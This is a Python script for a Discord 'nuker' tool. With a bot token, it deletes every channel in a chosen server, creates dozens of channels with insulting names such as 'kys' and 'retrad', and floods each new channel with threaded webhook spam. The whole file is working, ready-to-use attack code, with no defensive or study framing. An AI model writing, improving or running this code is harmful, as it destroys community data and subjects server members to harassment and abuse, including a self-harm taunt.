import discord
from discord.ext import commands
from discord import app_commands
import threading
import requests
import time
import random

intents = discord.Intents.default()
intents.guilds = True

client = commands.Bot(command_prefix=None, intents=intents)
tree = client.tree


class Nuker:
    @staticmethod
    def get_random_string():
        messages = ["you suck", "kasuto sigma ez nn", "ezzzz", "retrad", "dummy", "noo my server gone", "nn", "kasuto", "kys kasuto", "kys", "ezzzzzz", "ohhh no my server nuked noooo", "imagine getting nuked", "dumb", "ezzzzzzzzzzzzzzzzzzzz", "your not that smart bro", "get nuked lmao ez", "lmao"]
        return random.choice(messages)

    @staticmethod
    def get_channels(token, guild_id):
        headers = {"Authorization": f"Bot {token}"}
        r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers)
        if r.status_code == 200:
            return [channel["id"] for channel in r.json()]
        return []

    @staticmethod
    def delete_channel(token, channel_id):
        headers = {"Authorization": f"Bot {token}"}
        requests.delete(f"https://discord.com/api/v10/channels/{channel_id}", headers=headers)

    @staticmethod
    def create_channel(token, guild_id):
        headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
        payload = {
            "name": Nuker.get_random_string(),
            "type": 0
        }
        requests.post(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, json=payload)

    @staticmethod
    def spam_webhook(webhook_url, msg):
        for _ in range(50):
            threading.Thread(target=requests.post, args=(webhook_url,), kwargs={"json": {"content": msg}}).start()

    @staticmethod
    def create_webhook_for_channel(token, channel_id, msg):
        headers = {
            "Authorization": f"Bot {token}",
            "Content-Type": "application/json"
        }
        payload = {
            "name": "Nuked ezzzz"
        }
        r = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", headers=headers, json=payload)
        if r.status_code == 200:
            webhook_url = f'https://discord.com/api/webhooks/{r.json()["id"]}/{r.json()["token"]}'
            Nuker.spam_webhook(webhook_url, msg)

    @staticmethod
    def nuke_guild(token, guild_id, msg):
        print(f"[!] Nuking guild {guild_id}")
        channels = Nuker.get_channels(token, guild_id)
        for ch in channels:
            threading.Thread(target=Nuker.delete_channel, args=(token, ch)).start()

        time.sleep(5)

        for _ in range(60):
            threading.Thread(target=Nuker.create_channel, args=(token, guild_id)).start()

        time.sleep(5)

        new_channels = Nuker.get_channels(token, guild_id)
        for ch in new_channels:
            threading.Thread(target=Nuker.create_webhook_for_channel, args=(token, ch, msg)).start()

    @staticmethod
    def get_guilds(token):
        headers = {"Authorization": f"Bot {token}"}
        r = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers)
        if r.status_code == 200:
            return r.json()
        else:
            print(f"Failed to fetch guilds: {r.text}")
            return []

def main():
    token = input("Enter your Bot Token: ").strip()

    guilds = Nuker.get_guilds(token)

    if not guilds:
        print("No guilds found or invalid token.")
        return

    print("\nBot is in the following servers:\n")
    for idx, guild in enumerate(guilds, start=1):
        print(f"{idx}: {guild['name']} (ID: {guild['id']})")

    choice = input("\nWhat server would you like to see? Enter the number: ").strip()
    if not choice.isdigit() or not (1 <= int(choice) <= len(guilds)):
        print("Invalid choice.")
        return

    selected_guild = guilds[int(choice) - 1]
    guild_id = selected_guild["id"]

    message = input("Enter the message you want to spam: ").strip()

    Nuker.nuke_guild(token, guild_id, message)


if __name__ == "__main__":
    main()
